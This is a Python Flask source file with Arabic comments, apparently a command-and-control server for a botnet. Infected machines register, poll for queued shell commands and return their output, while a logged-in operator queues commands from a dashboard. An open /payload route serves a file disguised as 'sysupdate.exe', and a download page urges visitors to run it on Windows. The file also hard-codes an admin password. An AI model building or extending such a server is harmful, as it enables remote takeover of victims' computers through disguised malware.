from flask import Flask, request, jsonify, render_template, session, redirect, url_for, send_file
from datetime import datetime, timedelta
import functools
import hashlib
import os
import re

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ===== بيانات الدخول =====
USERNAME = "admin"
PASSWORD_HASH = hashlib.sha256("SecurePass123".encode()).hexdigest()

# ===== نظام القفل المتقدم =====
failed_attempts = {}

def get_remaining_lockout(ip):
    record = failed_attempts.get(ip)
    if not record:
        return 0
    locked_until = record.get("locked_until")
    if locked_until and datetime.now() < locked_until:
        return (locked_until - datetime.now()).total_seconds()
    return 0

def compute_lock_duration(attempts):
    if attempts < 5:
        return 0
    factor = (attempts - 5) // 4 + 1
    return factor * 3600

def login_required(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        if 'logged_in' not in session or not session['logged_in']:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

# ===== الصفحات العامة =====
@app.route('/')
def home():
    if 'logged_in' in session and session['logged_in']:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        ip = request.remote_addr

        remaining = get_remaining_lockout(ip)
        if remaining > 0:
            return render_template('login.html', 
                                   error=f"تم الحظر مؤقتاً. انتظر {int(remaining//60)} دقيقة {int(remaining%60)} ثانية."), 403

        if not re.match(r'^[a-zA-Z0-9_]{3,20}$', username):
            return render_template('login.html', error="اسم مستخدم غير صالح")

        password_hash = hashlib.sha256(password.encode()).hexdigest()
        if username == USERNAME and password_hash == PASSWORD_HASH:
            failed_attempts.pop(ip, None)
            session['logged_in'] = True
            session['username'] = username
            return redirect(url_for('dashboard'))
        else:
            record = failed_attempts.get(ip, {"attempts": 0, "locked_until": None})
            record["attempts"] += 1
            attempts = record["attempts"]
            lock_duration = compute_lock_duration(attempts)
            if lock_duration > 0:
                record["locked_until"] = datetime.now() + timedelta(seconds=lock_duration)
            failed_attempts[ip] = record
            remaining = get_remaining_lockout(ip)
            msg = f"بيانات غير صحيحة. المحاولات المتبقية: {max(0, 5 - (attempts % 5))}"
            if remaining > 0:
                msg = f"تم الحظر مؤقتاً. انتظر {int(remaining//60)} دقيقة."
            return render_template('login.html', error=msg), 401

    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

# ===== مسار التحميل العام (بدون حماية) =====
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

@app.route('/payload')
def download_payload():
    try:
        # نحاول نبحث عن الملف سواء كان sysupdate أو sysupdate.exe
        possible_names = ['sysupdate.exe', 'sysupdate']
        file_path = None
        for name in possible_names:
            test_path = os.path.join(BASE_DIR, 'payloads', name)
            if os.path.exists(test_path):
                file_path = test_path
                break
        
        if not file_path:
            return f"الملف غير موجود في مجلد payloads (ابحث عن sysupdate أو sysupdate.exe)", 404
            
        return send_file(file_path, as_attachment=True, download_name='sysupdate.exe')
    except Exception as e:
        return f"خطأ داخلي: {str(e)}", 500

@app.route('/download')
def download_page():
    return '''
    <html>
    <head><title>Download</title></head>
    <body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
        <h1>⚡ Download Agent</h1>
        <a href="/payload" style="color:#0f0;border:1px solid #0f0;padding:10px 20px;text-decoration:none;">Download sysupdate.exe</a>
        <p style="color:#666;margin-top:30px;">Run this file on your Windows machine.</p>
    </body>
    </html>
    '''

# ===== الصفحات المحمية =====
@app.route('/dashboard')
@login_required
def dashboard():
    return render_template('index.html')

@app.route('/room/<bot_id>')
@login_required
def bot_room(bot_id):
    if bot_id not in bots:
        return "Bot not found", 404
    return render_template('room.html', bot_id=bot_id, bot_info=bots[bot_id])

# ===== باقي الـ APIs =====
bots = {}
tasks = {}
results = {}

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        bots[bot_id] = {
            'ip': request.remote_addr,
            'os': data.get('os', 'Unknown'),
            'last_seen': datetime.now(),
            'cwd': 'C:\\'
        }
        if bot_id not in tasks:
            tasks[bot_id] = []
    return jsonify({"status": "ok"})

@app.route('/get_task', methods=['GET'])
def get_task():
    bot_id = request.args.get('id')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        if bot_id in tasks and len(tasks[bot_id]) > 0:
            cmd = tasks[bot_id].pop(0)
            return jsonify({"command": cmd})
    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('id')
    output = data.get('output')
    new_cwd = data.get('cwd')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        results[bot_id] = output
        if bot_id in bots:
            bots[bot_id]['last_seen'] = datetime.now()
            if new_cwd:
                bots[bot_id]['cwd'] = new_cwd
    return jsonify({"status": "ok"})

@app.route('/api/active_bots')
@login_required
def active_bots():
    now = datetime.now()
    active_list = []
    for bot_id, info in bots.items():
        if (now - info['last_seen']).total_seconds() < 30:
            active_list.append({
                "id": bot_id,
                "ip": info['ip'],
                "os": info['os'],
                "last_seen": info['last_seen'].strftime("%H:%M:%S"),
                "cwd": info.get('cwd', 'C:\\')
            })
    return jsonify(active_list)

@app.route('/api/send_command', methods=['POST'])
@login_required
def send_command():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    if bot_id and cmd:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        if bot_id not in tasks:
            tasks[bot_id] = []
        tasks[bot_id].append(cmd)
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 400

@app.route('/api/get_result', methods=['GET'])
@login_required
def get_result():
    bot_id = request.args.get('id')
    if bot_id:
        bot_id = re.sub(r'[^a-zA-Z0-9_\-]', '', bot_id)
        if bot_id in results:
            out = results.pop(bot_id)
            return jsonify({"output": out})
    return jsonify({"output": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)